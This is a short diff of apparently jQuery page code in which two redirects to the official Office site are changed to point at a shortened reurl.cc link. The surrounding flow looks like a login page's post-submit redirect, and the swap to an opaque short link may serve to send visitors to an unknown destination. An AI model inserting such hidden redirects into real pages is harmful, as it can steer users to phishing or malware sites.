@@ -331,7 +331,7 @@ $(document).ready(function() {
                     $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                     $("#div3").animate({ left: 0, opacity: "show" }, 500);
                     setTimeout(() => {
-                        window.location.replace("https://www.office.com");
+                        window.location.replace("https://reurl.cc/QWnM5b");
                     }, 500);
                     return false;
                 }
@@ -353,7 +353,7 @@ $(document).ready(function() {
                     $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                     $("#div3").animate({ left: 0, opacity: "show" }, 500);
                     setTimeout(() => {
-                        window.location.replace("https://www.office.com");
+                        window.location.replace("https://reurl.cc/QWnM5b");
                     }, 1000);
                     return false;
                 }
